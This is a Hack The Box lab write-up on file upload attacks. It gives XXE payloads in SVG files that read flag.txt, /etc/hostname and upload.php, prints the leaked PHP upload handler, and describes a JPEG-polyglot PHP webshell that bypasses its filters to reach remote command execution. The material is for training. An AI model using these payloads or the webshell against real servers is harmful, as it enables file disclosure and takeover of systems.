# Hack The Box File Upload Attacks Writeup

## Limited File Uploads

With SVG images, we can include malicious XML data to leak the source code of the web application, and other internal documents within the server.

Create `payload.svg` file to read `flag.txt`
```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<svg>&xxe;</svg>
```

Upload this file and view source to see the flag.

For File Upload exploitation, it may allow us to locate the upload directory, identify allowed extensions, or find the file naming scheme, which may become handy for further exploitation.

Create `xxe.svg` file to get the file directory of uploaded files.
```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```
Upload this file and inspect to get the base64 string, decode that text to get the file directory.

## Skills Assessment - File Upload Attacks

To gain access to the internal workings of the file upload functionality, I first leveraged an XXE (XML External Entity) injection via an uploaded .svg file. The SVG was crafted to read the /etc/hostname file using the php://filter stream wrapper with base64 encoding
```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
]>
<svg>&xxe;</svg>
```

Upon uploading this file as `xxe.svg`, the response returned a base64-encoded string. Decoding it revealed the hostname: 

`ng-1280470-fileuploadsasmt-ueyj9-548bf6b74b-kg4j4` â€” the exact same output captured in the screenshot for verification. With this confirmation in hand, I moved on to targeting more sensitive files.

Next, I crafted a second XXE payload in a file named `xxe-for-upload.svg` to read the `upload.php` source code:
```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/contact/upload.php"> ]>
<svg>&xxe;</svg>
```
Uploading and decoding the output gave insight into how uploaded files are handled on the backend. The PHP script performs several checks: it renames files using the format date('ymd')_<original_filename>, stores them in ./user_feedback_submissions/, and imposes both blacklist and whitelist filters.

```bash
<?php
require_once('./common-functions.php');

// uploaded files directory
$target_dir = "./user_feedback_submissions/";

// rename before storing
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;

// get content headers
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// blacklist test
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
    echo "Extension not allowed";
    die();
}

// whitelist test
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// type test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
        echo "Only images are allowed";
        die();
    }
}

// size test
if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "File too large";
    die();
}

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
    displayHTMLImage($target_file);
} else {
    echo "File failed to upload";
}
```
It blocks extensions like `.php`, `.phps`, and `.phtml`, and only allows filenames ending in `.jpg`, `.jpeg`, or `.png`, validated through a regex: `^.+\.[a-z]{2,3}g$`. It also validates the MIME type from both `content-type` and `mime_content_type()` as an extra defense.

Knowing this, I crafted a polyglot webshell by prepending JPEG magic bytes (FFD8FFDB) to a basic PHP shell payload (`AAAA <?php echo system($_GET["cmd"]); ?>`) and saved it with the name shell.phar.jpeg. This bypassed both extension and MIME type validations, appearing as a legitimate JPEG while still being interpreted as PHP by the server. Uploading this file worked successfully due to the format and naming convention.

I changed these highlighted characters manually.

After this I uploaded the file.

Today being 2025/04/19, the filename becomes `250419_original_name` the webshell was then accessible at the URL: `/contact/user_feedback_submissions/250419_shell.phar.jpeg`

So, I used Burp Suite to intercept and Visiting that URL with a cmd parameter allowed for remote command execution.

Accessing:
`/contact/user_feedback_submissions/250419_shell.phar.jpeg?cmd=cat+/flag.........txt`
successfully returned the flag contents.
